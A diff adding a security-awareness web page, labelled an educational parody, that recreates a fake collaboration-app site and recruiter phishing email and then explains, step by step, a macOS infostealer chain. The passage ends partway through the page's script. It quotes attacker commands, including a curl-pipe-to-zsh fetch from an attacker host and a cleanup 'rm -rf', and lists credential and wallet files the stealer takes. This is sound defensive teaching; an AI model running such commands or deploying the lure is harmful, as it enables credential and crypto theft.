@@ -1,0 +1,959 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Fusser - AI-Powered Team Collaboration Platform (EDUCATIONAL PARODY)</title>
+    <link rel="icon" type="image/png" href="assets/icon.png">
+    <style>
+        :root {
+            --sky: #0ea5e9;
+            --sky-dark: #0284c7;
+            --sky-light: #e0f2fe;
+            --red: #ef4444;
+            --red-dark: #dc2626;
+            --amber: #f59e0b;
+            --green: #22c55e;
+            --bg: #0f172a;
+            --bg-card: #1e293b;
+            --bg-surface: #334155;
+            --text: #f1f5f9;
+            --text-muted: #94a3b8;
+            --danger-bg: #450a0a;
+            --danger-border: #991b1b;
+            --warn-bg: #451a03;
+            --warn-border: #92400e;
+        }
+
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+            background: var(--bg);
+            color: var(--text);
+            line-height: 1.6;
+        }
+
+        /* ===== PHASE 1: The "Legit" Landing Page ===== */
+        .landing {
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+        }
+
+        .nav {
+            width: 100%;
+            padding: 1rem 2rem;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            backdrop-filter: blur(12px);
+            border-bottom: 1px solid rgba(255,255,255,0.06);
+            position: sticky;
+            top: 0;
+            z-index: 100;
+            background: rgba(15, 23, 42, 0.8);
+        }
+
+        .nav-brand {
+            display: flex;
+            align-items: center;
+            gap: 0.5rem;
+            font-size: 1.5rem;
+            font-weight: 700;
+            color: var(--sky);
+        }
+
+        .nav-brand img { height: 32px; }
+
+        .nav-links { display: flex; gap: 2rem; }
+        .nav-links a {
+            color: var(--text-muted);
+            text-decoration: none;
+            font-size: 0.9rem;
+            transition: color 0.2s;
+        }
+        .nav-links a:hover { color: var(--text); }
+
+        .hero {
+            padding: 6rem 2rem 4rem;
+            text-align: center;
+            max-width: 800px;
+        }
+
+        .hero-badge {
+            display: inline-block;
+            padding: 0.3rem 1rem;
+            background: rgba(14, 165, 233, 0.1);
+            border: 1px solid rgba(14, 165, 233, 0.3);
+            border-radius: 999px;
+            color: var(--sky);
+            font-size: 0.8rem;
+            font-weight: 500;
+            margin-bottom: 1.5rem;
+        }
+
+        .hero h1 {
+            font-size: 3.5rem;
+            font-weight: 800;
+            line-height: 1.1;
+            margin-bottom: 1.5rem;
+            background: linear-gradient(135deg, #fff, var(--sky));
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+        }
+
+        .hero p {
+            font-size: 1.2rem;
+            color: var(--text-muted);
+            max-width: 600px;
+            margin: 0 auto 2rem;
+        }
+
+        .hero-stats {
+            display: flex;
+            justify-content: center;
+            gap: 3rem;
+            margin-top: 2rem;
+        }
+
+        .stat { text-align: center; }
+        .stat-value { font-size: 1.5rem; font-weight: 700; color: var(--sky); }
+        .stat-label { font-size: 0.8rem; color: var(--text-muted); }
+
+        .cta-group {
+            display: flex;
+            gap: 1rem;
+            justify-content: center;
+            flex-wrap: wrap;
+        }
+
+        .btn {
+            padding: 0.8rem 2rem;
+            border-radius: 0.5rem;
+            font-size: 1rem;
+            font-weight: 600;
+            cursor: pointer;
+            border: none;
+            transition: all 0.2s;
+            text-decoration: none;
+            display: inline-flex;
+            align-items: center;
+            gap: 0.5rem;
+        }
+
+        .btn-primary {
+            background: var(--sky);
+            color: white;
+        }
+        .btn-primary:hover { background: var(--sky-dark); transform: translateY(-1px); }
+
+        .btn-secondary {
+            background: var(--bg-card);
+            color: var(--text);
+            border: 1px solid var(--bg-surface);
+        }
+        .btn-secondary:hover { border-color: var(--sky); }
+
+        .features {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
+            gap: 1.5rem;
+            padding: 4rem 2rem;
+            max-width: 1200px;
+            width: 100%;
+        }
+
+        .feature-card {
+            background: var(--bg-card);
+            border: 1px solid rgba(255,255,255,0.06);
+            border-radius: 1rem;
+            padding: 2rem;
+            transition: border-color 0.2s;
+        }
+        .feature-card:hover { border-color: var(--sky); }
+        .feature-icon { font-size: 2rem; margin-bottom: 1rem; }
+        .feature-card h3 { margin-bottom: 0.5rem; }
+        .feature-card p { color: var(--text-muted); font-size: 0.9rem; }
+
+        .testimonials {
+            padding: 4rem 2rem;
+            max-width: 1000px;
+            width: 100%;
+        }
+
+        .testimonials h2 {
+            text-align: center;
+            font-size: 2rem;
+            margin-bottom: 2rem;
+        }
+
+        .testimonial-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(280px, 1fr));
+            gap: 1.5rem;
+        }
+
+        .testimonial {
+            background: var(--bg-card);
+            border-radius: 1rem;
+            padding: 1.5rem;
+            border: 1px solid rgba(255,255,255,0.06);
+        }
+
+        .testimonial-stars { color: var(--amber); margin-bottom: 0.5rem; }
+        .testimonial p { color: var(--text-muted); font-size: 0.9rem; font-style: italic; }
+        .testimonial-author {
+            margin-top: 1rem;
+            display: flex;
+            align-items: center;
+            gap: 0.75rem;
+        }
+        .testimonial-avatar {
+            width: 40px; height: 40px;
+            border-radius: 50%;
+            background: var(--bg-surface);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 1.2rem;
+        }
+        .testimonial-name { font-weight: 600; font-size: 0.85rem; }
+        .testimonial-role { color: var(--text-muted); font-size: 0.75rem; }
+
+        .integrations {
+            padding: 3rem 2rem;
+            text-align: center;
+        }
+        .integrations h2 { margin-bottom: 1.5rem; font-size: 1.5rem; }
+        .integration-logos {
+            display: flex;
+            gap: 2rem;
+            justify-content: center;
+            flex-wrap: wrap;
+            opacity: 0.5;
+        }
+        .integration-logos img { height: 32px; filter: grayscale(1) brightness(2); }
+
+        /* ===== PHASE 2: The "Download" Modal ===== */
+        .modal-overlay {
+            display: none;
+            position: fixed;
+            inset: 0;
+            background: rgba(0,0,0,0.8);
+            backdrop-filter: blur(4px);
+            z-index: 200;
+            justify-content: center;
+            align-items: center;
+        }
+        .modal-overlay.active { display: flex; }
+
+        .modal {
+            background: var(--bg-card);
+            border: 1px solid rgba(255,255,255,0.1);
+            border-radius: 1rem;
+            padding: 2.5rem;
+            max-width: 480px;
+            width: 90%;
+            text-align: center;
+        }
+
+        .modal h2 { margin-bottom: 0.5rem; }
+        .modal p { color: var(--text-muted); margin-bottom: 1.5rem; font-size: 0.9rem; }
+
+        .invite-input {
+            width: 100%;
+            padding: 0.8rem 1rem;
+            background: var(--bg);
+            border: 1px solid var(--bg-surface);
+            border-radius: 0.5rem;
+            color: var(--text);
+            font-size: 1rem;
+            margin-bottom: 1rem;
+            text-align: center;
+            letter-spacing: 0.1em;
+        }
+        .invite-input:focus {
+            outline: none;
+            border-color: var(--sky);
+        }
+
+        .os-selector {
+            display: flex;
+            gap: 0.5rem;
+            margin-bottom: 1.5rem;
+        }
+        .os-btn {
+            flex: 1;
+            padding: 0.6rem;
+            background: var(--bg);
+            border: 1px solid var(--bg-surface);
+            border-radius: 0.5rem;
+            color: var(--text-muted);
+            cursor: pointer;
+            font-size: 0.85rem;
+            transition: all 0.2s;
+        }
+        .os-btn.active {
+            border-color: var(--sky);
+            color: var(--sky);
+            background: rgba(14, 165, 233, 0.1);
+        }
+
+        /* ===== PHASE 3: The Warnings ===== */
+        .warning-chain {
+            display: none;
+            min-height: 100vh;
+            padding: 2rem;
+            max-width: 800px;
+            margin: 0 auto;
+        }
+        .warning-chain.active { display: block; }
+
+        .warning-step {
+            background: var(--danger-bg);
+            border: 2px solid var(--danger-border);
+            border-radius: 1rem;
+            padding: 2rem;
+            margin-bottom: 1.5rem;
+            animation: slideIn 0.5s ease-out;
+            display: none;
+        }
+        .warning-step.visible { display: block; }
+
+        @keyframes slideIn {
+            from { opacity: 0; transform: translateY(20px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+
+        .warning-step.amber {
+            background: var(--warn-bg);
+            border-color: var(--warn-border);
+        }
+
+        .warning-step.green {
+            background: #052e16;
+            border-color: #166534;
+        }
+
+        .warning-header {
+            display: flex;
+            align-items: center;
+            gap: 0.75rem;
+            margin-bottom: 1rem;
+        }
+
+        .warning-icon { font-size: 1.5rem; }
+        .warning-title { font-size: 1.1rem; font-weight: 700; }
+
+        .warning-step .step-number {
+            display: inline-flex;
+            align-items: center;
+            justify-content: center;
+            width: 28px;
+            height: 28px;
+            background: var(--red);
+            color: white;
+            border-radius: 50%;
+            font-size: 0.8rem;
+            font-weight: 700;
+        }
+
+        .warning-step.amber .step-number { background: var(--amber); color: #000; }
+        .warning-step.green .step-number { background: var(--green); }
+
+        .warning-body { color: var(--text-muted); line-height: 1.8; }
+        .warning-body code {
+            background: rgba(0,0,0,0.3);
+            padding: 0.15rem 0.4rem;
+            border-radius: 0.25rem;
+            font-family: 'SF Mono', 'Cascadia Code', 'Fira Code', monospace;
+            font-size: 0.85em;
+            color: var(--red);
+        }
+
+        .warning-step.amber .warning-body code { color: var(--amber); }
+        .warning-step.green .warning-body code { color: var(--green); }
+
+        .next-btn {
+            margin-top: 1rem;
+            padding: 0.6rem 1.5rem;
+            background: var(--red-dark);
+            color: white;
+            border: none;
+            border-radius: 0.5rem;
+            cursor: pointer;
+            font-size: 0.9rem;
+            font-weight: 600;
+        }
+
+        .warning-step.amber .next-btn { background: #b45309; }
+        .warning-step.green .next-btn { background: #15803d; }
+
+        .attack-diagram {
+            background: rgba(0,0,0,0.3);
+            border-radius: 0.5rem;
+            padding: 1.5rem;
+            margin: 1rem 0;
+            font-family: 'SF Mono', 'Cascadia Code', monospace;
+            font-size: 0.8rem;
+            line-height: 1.6;
+            white-space: pre;
+            overflow-x: auto;
+            color: var(--text-muted);
+        }
+
+        .final-banner {
+            text-align: center;
+            padding: 3rem 2rem;
+            display: none;
+        }
+        .final-banner.active { display: block; }
+
+        .final-banner h1 {
+            font-size: 3rem;
+            margin-bottom: 1rem;
+        }
+
+        .final-banner .safe-msg {
+            font-size: 1.2rem;
+            color: var(--green);
+            margin-bottom: 2rem;
+        }
+
+        .real-link {
+            color: var(--sky);
+            text-decoration: none;
+        }
+        .real-link:hover { text-decoration: underline; }
+
+        .hidden { display: none; }
+
+        @media (max-width: 768px) {
+            .hero h1 { font-size: 2.2rem; }
+            .hero-stats { flex-direction: column; gap: 1rem; }
+            .nav-links { display: none; }
+            .features { grid-template-columns: 1fr; }
+        }
+    </style>
+</head>
+<body>
+
+<!-- ===== PHASE 1: FAKE LANDING PAGE ===== -->
+<div class="landing" id="landing">
+    <nav class="nav">
+        <div class="nav-brand">
+            <img src="assets/icon.png" alt="Fusser" onerror="this.style.display='none'">
+            <span>Fusser</span>
+        </div>
+        <div class="nav-links">
+            <a href="#features">Features</a>
+            <a href="#testimonials">Testimonials</a>
+            <a href="#integrations">Integrations</a>
+            <a href="#" onclick="event.preventDefault(); openModal('download', 'mac')">Download</a>
+        </div>
+    </nav>
+
+    <!-- Phishing email recreation (visible on scroll) -->
+    <div id="email-preview" style="max-width: 560px; width: 90%; margin: 2rem auto 0; background: #1a1a1a; border-radius: 1rem; border: 1px solid #333; overflow: hidden; cursor: pointer;" onclick="this.style.display='none'">
+        <div style="background: linear-gradient(135deg, #2563eb, #3b82f6); padding: 1.5rem 2rem;">
+            <h2 style="font-size: 1.5rem; font-weight: 700; color: white;">Meeting Request</h2>
+        </div>
+        <div style="padding: 2rem;">
+            <p style="color: #ccc; margin-bottom: 1rem;">Hi Zach,</p>
+            <p style="color: #ccc; margin-bottom: 0.5rem;">Daniel Beaumont would like to book a call with you regarding</p>
+            <p style="color: #5b9bd5; font-weight: 700; margin-bottom: 1rem;">Cyrus Global Holding.</p>
+            <p style="color: #999; margin-bottom: 1.5rem;">Please select a time slot that works best for your schedule.</p>
+            <div style="border: 1px solid #444; border-radius: 0.75rem; padding: 1.5rem; margin-bottom: 1.5rem;">
+                <div style="color: #5b9bd5; font-size: 0.7rem; text-transform: uppercase; letter-spacing: 0.1em;">Organizer</div>
+                <div style="color: #fff; font-weight: 700; margin-bottom: 0.75rem;">Daniel Beaumont</div>
+                <div style="color: #5b9bd5; font-size: 0.7rem; text-transform: uppercase; letter-spacing: 0.1em;">Company</div>
+                <div style="color: #fff; font-weight: 700; margin-bottom: 0.75rem;">Cyrus Global Holding</div>
+                <div style="color: #5b9bd5; font-size: 0.7rem; text-transform: uppercase; letter-spacing: 0.1em;">Role</div>
+                <div style="color: #fff; font-weight: 700; margin-bottom: 0.75rem;">Founding CTO</div>
+                <div style="color: #5b9bd5; font-size: 0.7rem; text-transform: uppercase; letter-spacing: 0.1em;">Duration</div>
+                <div style="color: #fff; font-weight: 700;">30 minutes</div>
+            </div>
+            <div style="text-align: center;">
+                <div style="display: inline-block; background: #2563eb; color: white; padding: 0.75rem 2rem; border-radius: 2rem; font-weight: 600; cursor: pointer;" onclick="event.stopPropagation(); openModal('download', detectOS())">Select Time Slot</div>
+            </div>
+            <div style="text-align: center; margin-top: 1.5rem; padding-top: 1rem; border-top: 1px solid #333;">
+                <div style="color: #777; font-size: 0.8rem;">Can't click the button? Copy this link:</div>
+                <div style="color: #5b9bd5; font-size: 0.75rem; margin-top: 0.25rem;">https://fusser.ai/calendar/0a0fe769-70f4-494a-bc3b-9bf1ef5d9cb6</div>
+                <div style="color: #777; font-size: 0.75rem; margin-top: 0.5rem;">Sent via <span style="color: #5b9bd5;">Fusser</span></div>
+            </div>
+        </div>
+    </div>
+
+    <div class="hero">
+        <div class="hero-badge">Now with AI-powered real-time transcription</div>
+        <h1>Where Teams Come Together</h1>
+        <p>Transform how your team collaborates. Crystal-clear video calls, real-time AI transcription, smart task management, and seamless file sharing in one powerful platform.</p>
+
+        <div class="cta-group">
+            <button class="btn btn-primary" onclick="openModal('download', detectOS())">
+                Download for Free
+            </button>
+            <button class="btn btn-secondary" onclick="openModal('join')">
+                Join a Meeting
+            </button>
+        </div>
+
+        <div class="hero-stats">
+            <div class="stat">
+                <div class="stat-value">2,847</div>
+                <div class="stat-label">5-star reviews</div>
+            </div>
+            <div class="stat">
+                <div class="stat-value">50K+</div>
+                <div class="stat-label">Active teams</div>
+            </div>
+            <div class="stat">
+                <div class="stat-value">99.9%</div>
+                <div class="stat-label">Uptime</div>
+            </div>
+        </div>
+    </div>
+
+    <div class="features" id="features">
+        <div class="feature-card">
+            <div class="feature-icon">&#127909;</div>
+            <h3>Crystal-Clear Video</h3>
+            <p>4K video conferencing with AI-powered noise cancellation and virtual backgrounds.</p>
+        </div>
+        <div class="feature-card">
+            <div class="feature-icon">&#128172;</div>
+            <h3>Real-Time Transcription</h3>
+            <p>AI transcribes every meeting in real-time with 99% accuracy across 40+ languages.</p>
+        </div>
+        <div class="feature-card">
+            <div class="feature-icon">&#9989;</div>
+            <h3>Smart Task Management</h3>
+            <p>AI extracts action items from meetings and creates tasks automatically.</p>
+        </div>
+        <div class="feature-card">
+            <div class="feature-icon">&#128274;</div>
+            <h3>Enterprise Security</h3>
+            <p>End-to-end encryption, SOC2 compliance, and advanced admin controls.</p>
+        </div>
+        <div class="feature-card">
+            <div class="feature-icon">&#128196;</div>
+            <h3>File Sharing</h3>
+            <p>Share files up to 10GB with version history and real-time collaboration.</p>
+        </div>
+        <div class="feature-card">
+            <div class="feature-icon">&#127760;</div>
+            <h3>40+ Integrations</h3>
+            <p>Connect with Slack, Notion, Jira, GitHub, Google Calendar, and more.</p>
+        </div>
+    </div>
+
+    <div class="testimonials" id="testimonials">
+        <h2>Loved by Teams Worldwide</h2>
+        <div class="testimonial-grid">
+            <div class="testimonial">
+                <div class="testimonial-stars">&#9733;&#9733;&#9733;&#9733;&#9733;</div>
+                <p>"Fusser has completely transformed our remote team collaboration. The AI transcription is game-changing."</p>
+                <div class="testimonial-author">
+                    <div class="testimonial-avatar">&#128104;</div>
+                    <div>
+                        <div class="testimonial-name">These People</div>
+                        <div class="testimonial-role">Do Not Exist, FakeStartup Inc.</div>
+                    </div>
+                </div>
+            </div>
+            <div class="testimonial">
+                <div class="testimonial-stars">&#9733;&#9733;&#9733;&#9733;&#9733;</div>
+                <p>"We switched from Zoom and haven't looked back. The meeting insights are incredibly valuable."</p>
+                <div class="testimonial-author">
+                    <div class="testimonial-avatar">&#128105;</div>
+                    <div>
+                        <div class="testimonial-name">Nobody Real</div>
+                        <div class="testimonial-role">Head of Imaginary, NotACompany Corp</div>
+                    </div>
+                </div>
+            </div>
+            <div class="testimonial">
+                <div class="testimonial-stars">&#9733;&#9733;&#9733;&#9733;&#9733;</div>
+                <p>"The best collaboration tool we've ever used. Period. Worth every penny."</p>
+                <div class="testimonial-author">
+                    <div class="testimonial-avatar">&#129489;</div>
+                    <div>
+                        <div class="testimonial-name">Also Fake</div>
+                        <div class="testimonial-role">CTO, Definitely Not Malware Ltd</div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <div class="integrations" id="integrations">
+        <h2>Works With Your Favorite Tools</h2>
+        <div class="integration-logos">
+            <img src="https://cdn.simpleicons.org/slack/4A154B" alt="Slack" onerror="this.alt='Slack'">
+            <img src="https://cdn.simpleicons.org/notion/000000" alt="Notion" onerror="this.alt='Notion'">
+            <img src="https://cdn.simpleicons.org/figma/F24E1E" alt="Figma" onerror="this.alt='Figma'">
+            <img src="https://cdn.simpleicons.org/jira/0052CC" alt="Jira" onerror="this.alt='Jira'">
+            <img src="https://cdn.simpleicons.org/github/181717" alt="GitHub" onerror="this.alt='GitHub'">
+            <img src="https://cdn.simpleicons.org/googlecalendar/4285F4" alt="Calendar" onerror="this.alt='Calendar'">
+        </div>
+    </div>
+</div>
+
+<!-- ===== PHASE 2: DOWNLOAD MODAL ===== -->
+<div class="modal-overlay" id="modal">
+    <div class="modal">
+        <h2 id="modal-title">Enter Your Invite Code</h2>
+        <p id="modal-desc">Enter the code shared by your team to download Fusser</p>
+
+        <input type="text" class="invite-input" id="invite-code" placeholder="Enter invite code..." maxlength="20">
+
+        <div class="os-selector" id="os-selector">
+            <button class="os-btn" data-os="mac" onclick="selectOS('mac')">&#127822; macOS</button>
+            <button class="os-btn" data-os="windows" onclick="selectOS('windows')">&#128187; Windows</button>
+        </div>
+
+        <button class="btn btn-primary" style="width: 100%" onclick="attemptDownload()">
+            Download Now
+        </button>
+
+        <p style="margin-top: 1rem; font-size: 0.75rem; color: var(--text-muted)">
+            By downloading, you agree to our Terms of Service
+        </p>
+    </div>
+</div>
+
+<!-- ===== PHASE 3: EDUCATIONAL WARNING CHAIN ===== -->
+<div class="warning-chain" id="warnings">
+
+    <div style="text-align: center; padding: 2rem 0 3rem;">
+        <h1 style="font-size: 2.5rem; margin-bottom: 0.5rem;">OOPS. GOT YOU.</h1>
+        <p style="color: var(--red); font-size: 1.1rem; font-weight: 600;">
+            This is an educational demonstration. Nothing was downloaded or executed.
+        </p>
+        <p style="color: var(--text-muted); margin-top: 0.5rem;">
+            But if this were real, here's exactly what would have happened to you:
+        </p>
+    </div>
+
+    <!-- Step 1 -->
+    <div class="warning-step visible" id="step-1">
+        <div class="warning-header">
+            <span class="step-number">1</span>
+            <span class="warning-icon">&#128680;</span>
+            <span class="warning-title">You Clicked a Link From a Stranger</span>
+        </div>
+        <div class="warning-body">
+            You received an email: <em>"Daniel Beaumont would like to book a call with you
+            regarding <strong>Cyrus Global Holding</strong>."</em> The role? <strong>Founding CTO</strong>.
+            The email was sent "via Fusser" with a calendar link to <code>fusser.ai</code>.
+            <br><br>
+            The site looked professional. It had testimonials, star ratings, integration logos.
+            <strong>None of it was real.</strong> The domain was registered days ago. The reviews
+            are fake. "Daniel Beaumont" and "Cyrus Global Holding" don't exist.
+            <br><br>
+            <strong>Red flag you missed:</strong> Real recruiters use Calendly, Google Calendar,
+            or LinkedIn. Not a custom scheduling app you've never heard of that requires downloading
+            software to "join a meeting."
+        </div>
+        <button class="next-btn" onclick="showStep(2)">What happens next &rarr;</button>
+    </div>
+
+    <!-- Step 2 -->
+    <div class="warning-step" id="step-2">
+        <div class="warning-header">
+            <span class="step-number">2</span>
+            <span class="warning-icon">&#128274;</span>
+            <span class="warning-title">You Entered an "Invite Code"</span>
+        </div>
+        <div class="warning-body">
+            The invite code was your <strong>personal tracking ID</strong>. It tells the attacker
+            exactly who you are and links this download to your conversation.
+            <br><br>
+            The backend at <code>sorvensorven.com</code> validates your code and serves a
+            personalized malware download. Every victim gets a unique token.
+            <br><br>
+            <strong>Red flag you missed:</strong> Zoom, Google Meet, and Teams don't need
+            invite codes to download their apps. They're on the App Store.
+        </div>
+        <button class="next-btn" onclick="showStep(3)">What happens next &rarr;</button>
+    </div>
+
+    <!-- Step 3 -->
+    <div class="warning-step" id="step-3">
+        <div class="warning-header">
+            <span class="step-number">3</span>
+            <span class="warning-icon">&#128190;</span>
+            <span class="warning-title">You Ran the "Installer"</span>
+        </div>
+        <div class="warning-body">
+            <strong>On Mac:</strong> The installer ran <code>curl -kfsSL http://fusser-api.com/... | zsh</code>
+            &mdash; downloading and immediately executing a script from the internet with no inspection.
+            <br><br>
+            <strong>On Windows:</strong> The MSI installer executed a similar payload chain.
+            <br><br>
+            The <code>-k</code> flag disabled TLS certificate verification. The script was
+            base64+gzip encoded so you couldn't read it even if you tried.
+            <br><br>
+            <strong>Red flag you missed:</strong> No legitimate app asks you to run <code>curl | sh</code>.
+            Ever. That pattern exists for one reason: to execute code before you can inspect it.
+        </div>
+        <button class="next-btn" onclick="showStep(4)">What happens next &rarr;</button>
+    </div>
+
+    <!-- Step 4 -->
+    <div class="warning-step" id="step-4">
+        <div class="warning-header">
+            <span class="step-number">4</span>
+            <span class="warning-icon">&#128228;</span>
+            <span class="warning-title">A Background Daemon Started</span>
+        </div>
+        <div class="warning-body">
+            The script decoded a hidden payload and spawned a <strong>background process</strong>
+            that redirected all output to <code>/dev/null</code> (invisible).
+            <br><br>
+            This daemon downloaded a 35KB AppleScript from the attacker's server and piped it
+            directly to <code>osascript</code> &mdash; macOS's built-in script interpreter.
+            <br><br>
+            You saw nothing. No Terminal window. No notification. No progress bar.
+            <br><br>
+            <strong>Red flag you missed:</strong> If you checked Activity Monitor, you would have
+            seen <code>osascript</code> running with unusual network connections.
+        </div>
+        <button class="next-btn" onclick="showStep(5)">What happens next &rarr;</button>
+    </div>
+
+    <!-- Step 5 -->
+    <div class="warning-step" id="step-5">
+        <div class="warning-header">
+            <span class="step-number">5</span>
+            <span class="warning-icon">&#128273;</span>
+            <span class="warning-title">A Fake Password Dialog Appeared</span>
+        </div>
+        <div class="warning-body">
+            You saw what looked like a standard macOS password prompt:
+            <br><br>
+            <div style="background: #2d2d2d; border-radius: 0.75rem; padding: 1.5rem; text-align: center; max-width: 350px; margin: 0 auto; border: 1px solid #555;">
+                <div style="font-size: 2rem; margin-bottom: 0.5rem;">&#128274;</div>
+                <div style="font-weight: 600; margin-bottom: 0.5rem;">System Preferences</div>
+                <div style="font-size: 0.85rem; color: #aaa; margin-bottom: 1rem;">Please enter your password to make changes.</div>
+                <div style="background: #1a1a1a; border: 1px solid #444; border-radius: 0.25rem; padding: 0.5rem; margin-bottom: 1rem; color: #666;">&#9679;&#9679;&#9679;&#9679;&#9679;&#9679;&#9679;&#9679;</div>
+                <div style="background: var(--sky); color: white; padding: 0.4rem 1rem; border-radius: 0.25rem; display: inline-block; font-size: 0.85rem;">Continue</div>
+            </div>
+            <br>
+            This was <strong>not</strong> a real macOS dialog. It was generated by the malware.
+            It used Apple's own lock icon. There was <strong>no Cancel button</strong>. It
+            <strong>looped forever</strong> until you typed the correct password. It validated
+            your password against the system using <code>dscl . authonly</code>.
+            <br><br>
+            <strong>Red flag you missed:</strong> Real macOS password prompts always have a Cancel
+            button. And they don't appear when you're "installing a video call app."
+        </div>
+        <button class="next-btn" onclick="showStep(6)">What happens next &rarr;</button>
+    </div>
+
+    <!-- Step 6 -->
+    <div class="warning-step" id="step-6">
+        <div class="warning-header">
+            <span class="step-number">6</span>
+            <span class="warning-icon">&#128176;</span>
+            <span class="warning-title">Everything Was Stolen</span>
+        </div>
+        <div class="warning-body">
+            With your password confirmed, the stealer went to work:
+            <div class="attack-diagram">
+STOLEN IN SECONDS:
+&#9642; macOS login password (confirmed via dscl)
+&#9642; Chrome master password (from Keychain)
+&#9642; All cookies from 13 browsers
+&#9642; All saved passwords from 13 browsers
+&#9642; All autofill data (credit cards, addresses)
+&#9642; 60+ crypto wallet browser extensions
+&#9642; 21+ desktop crypto wallets (Exodus, MetaMask, Ledger...)
+&#9642; Telegram session data (full account clone)
+&#9642; macOS Keychains (every saved password)
+&#9642; SSH keys (~/.ssh/)
+&#9642; AWS credentials (~/.aws/)
+&#9642; Kubernetes configs (~/.kube/)
+&#9642; Shell history (.zsh_history, .bash_history)
+&#9642; Git config (.gitconfig)
+&#9642; Sensitive files (*.pdf, *.seed, *.kdbx, *.pem, *.ovpn)
+&#9642; Safari cookies and Apple Notes
+&#9642; System info and running processes</div>
+
+            Everything was compressed into <code>/tmp/osalogging.zip</code> and uploaded to the
+            attacker's server in 10MB chunks with retry logic.
+            <br><br>
+            Then the staging directory was deleted: <code>rm -rf /tmp/sync*</code>
+        </div>
+        <button class="next-btn" onclick="showStep(7)">There's more... &rarr;</button>
+    </div>
+
+    <!-- Step 7 -->
+    <div class="warning-step" id="step-7">
+        <div class="warning-header">
+            <span class="step-number">7</span>
+            <span class="warning-icon">&#129535;</span>
+            <span class="warning-title">Your Ledger Was Backdoored</span>
+        </div>
+        <div class="warning-body">
+            If you had <strong>Ledger Wallet</strong> or <strong>Ledger Live</strong> installed,
+            the stealer downloaded a trojanized version of the app from the attacker's server and
+            <strong>replaced your real Ledger app</strong> with the backdoored version.
+            <br><br>
+            The trojaned app looks and works identically to the real one. But it intercepts your
+            seed phrases and transaction signing. Every transaction you make goes through the
+            attacker's code first.
+            <br><br>
+            It even re-signed the app with <code>codesign -f -d -s -</code> to bypass Gatekeeper.
+            <br><br>
+            <strong>This is why hardware wallets alone don't save you</strong> &mdash; if the
+            software interface is compromised, the hardware just signs whatever the malware tells it.
+        </div>
+        <button class="next-btn" onclick="showStep(8)">And finally... &rarr;</button>
+    </div>
+
+    <!-- Step 8 -->
+    <div class="warning-step" id="step-8">
+        <div class="warning-header">
+            <span class="step-number">8</span>
+            <span class="warning-icon">&#128683;</span>
+            <span class="warning-title">You Got a Fake Error Message</span>
+        </div>
+        <div class="warning-body">
+            After stealing everything, the malware showed you this:
+            <br><br>
+            <div style="background: #2d2d2d; border-radius: 0.75rem; padding: 1.5rem; text-align: center; max-width: 400px; margin: 0 auto; border: 1px solid #555;">
+                <div style="font-size: 2rem; margin-bottom: 0.5rem;">&#9888;&#65039;</div>
+                <div style="font-weight: 600; margin-bottom: 0.5rem;">System Preferences</div>
+                <div style="font-size: 0.85rem; color: #aaa; margin-bottom: 1rem;">Your Mac does not support this application. Try reinstalling or downloading the version for your system.</div>
+                <div style="background: var(--bg-surface); color: white; padding: 0.4rem 1rem; border-radius: 0.25rem; display: inline-block; font-size: 0.85rem;">OK</div>
+            </div>
+            <br>
+            You thought it just didn't work. You moved on. Maybe you tried the Windows version
+            next, or asked the "colleague" for help.
+            <br><br>
+            Meanwhile, the attacker already had everything.
+            <br><br>
+            <em>Fun fact: the "OK" button used Cyrillic "O" (U+041E) instead of Latin "O" &mdash;
+            an anti-grep evasion technique.</em>
+        </div>
+        <button class="next-btn" onclick="showStep(9)">Show me how to stay safe &rarr;</button>
+    </div>
+
+    <!-- Step 9: Safety -->
+    <div class="warning-step green" id="step-9">
+        <div class="warning-header">
+            <span class="step-number">&#10003;</span>
+            <span class="warning-icon">&#128737;</span>
+            <span class="warning-title">How to Protect Yourself</span>
+        </div>
+        <div class="warning-body">
+            <strong>1. Never run <code>curl | sh</code></strong> &mdash; always download, inspect, then execute.
+            <br><br>
+            <strong>2. Verify app signatures</strong> &mdash; run <code>codesign -vvvv /Applications/App.app</code>
+            <br><br>
+            <strong>3. Use a password manager</strong> &mdash; don't save passwords in browsers.
+            <br><br>
+            <strong>4. Use hardware 2FA</strong> &mdash; YubiKey for critical accounts.
+            <br><br>
+            <strong>5. Install Little Snitch or LuLu</strong> &mdash; monitor outbound connections.
+            <br><br>
+            <strong>6. Be skeptical of "invite code" downloads</strong> &mdash; real tools are on the App Store.
+            <br><br>
+            <strong>7. Check Activity Monitor</strong> &mdash; watch for unexpected <code>osascript</code> or <code>curl</code> processes.
+            <br><br>
+            <strong>8. If something asks for your password unexpectedly</strong> &mdash; check if the dialog has a Cancel button. Real macOS dialogs always do.
+            <br><br><br>
+            <div style="text-align: center;">
+                <a href="https://github.com/zeekay/fusser" class="real-link" style="font-size: 1.1rem; font-weight: 600;">
+                    Read the full forensic analysis on GitHub &rarr;
+                </a>
+                <br><br>
+                <span style="color: var(--text-muted); font-size: 0.85rem;">
+                    Educational security research by <a href="https://hanzo.ai" class="real-link">Hanzo AI</a>
+                </span>
+            </div>
+        </div>
+    </div>
+
+</div>
+
+<script>
+    let selectedOS = 'mac';
+    let currentStep = 1;
+
+    function detectOS() {
+        const ua = navigator.userAgent;
+        if (ua.includes('Win')) return 'windows';
+        return 'mac';
+    }
+
+    function selectOS(os) {
+        selectedOS = os;
+        document.querySelectorAll('.os-btn').forEach(btn => {
+            btn.classList.toggle('active', btn.dataset.os === os);
+        });
+    }
+
+    function openModal(type, os) {
+        const modal = document.getElementById('modal');
+        const title = document.getElementById('modal-title');
+        const desc = document.getElementById('modal-desc');
+        const osSelector = document.getElementById('os-selector');
+
+        if (type === 'download') {
+            title.textContent = 'Download Fusser';
+            desc.textContent = 'Enter the invite code shared by your team to get started';
+            osSelector.style.display = 'flex';
+            if (os) selectOS(os);
+        } else {
+            title.textContent = 'Join a Meeting';
